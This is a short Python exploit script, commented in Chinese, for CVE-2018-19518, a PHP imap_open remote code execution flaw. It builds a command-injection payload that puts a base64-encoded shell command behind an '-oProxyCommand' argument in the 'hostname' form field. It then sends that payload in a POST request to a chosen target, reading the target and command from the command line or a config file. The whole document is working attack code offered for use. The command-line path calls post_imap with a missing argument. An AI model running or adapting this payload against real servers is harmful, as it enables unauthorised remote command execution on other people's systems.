# RCE/PHP-imap-RCE-CVE-2018-19518
from email import header
import os
from requests import post
from requests.utils import quote
from base64 import b64encode
import sys
import toml


def generate_header(source_file_path:str) -> dict:
    """
    将从网页复制的请求头转换为 json 样式的文本  
    :param source_file_path: 源文件路径  
    :return: 请求头字典
    """
    # 目标文本
    headers: dict = dict()
    with open(source_file_path, "r") as f:
        lines: list[str] = f.readlines()
        length: int = len(lines)
        for i in range(length):
            line: str = lines[i].strip()
            split_line: list[str] = line.split(":")
            headers.update({split_line[0]: ":".join(split_line[1:]).strip()})
        print(headers)
        return headers


def gen_payload(command: str) -> str:
    """
    生成payload
    :param command: 命令
    :return: payload
    """
    host: str = "hostname=x+"
    proxyCommand: str = "-oProxyCommand=echo\t"
    command_str: str = command
    lin_b64_decode: str = "|base64\t-d|sh"
    suffix: str = "}&username=123&password=123"
    # base64 编码 b
    command_b64_str: str = str(b64encode(command_str.encode()))[2:-1]
    print(f"base64编码后为{command_b64_str}")
    # url 编码
    url_encode_str: str = quote(proxyCommand + command_b64_str + lin_b64_decode)
    print(f"url编码后:{url_encode_str}")
    payload: str = host + url_encode_str + suffix
    print(f"payload为{payload}")

    return payload

def post_imap(header_path: str, socket: str, command: str) -> None:
    """发送 Post 请求, 并在请求体中导入 payload  
    :param header: 请求头文本  
    :param socket: socket
    :param command: linux 命令
    :return: None
    """
    headers: dict = generate_header(header_path)

    url: str = f"http://{socket}"
    payload: str = gen_payload(command)

    post(url,headers=headers,data=payload)

if __name__ == "__main__":
    try:
        socket: str = sys.argv[1]
        command: str = sys.argv[2]
        post_imap(socket, command)
    except Exception as e:
        print(f"发生异常: {e}")
        print("检测到参数输入错误, 即将运行默认测试用例")
        # 读取配置文件
        config: dict[str] = toml.load(os.path.join(os.path.dirname(__file__), "config.toml"))
        header_path: str = os.path.join(os.path.dirname(__file__), config["header_path"])
        socket: str = config["socket"]
        command: str = config["command"]
        post_imap(header_path, socket, command)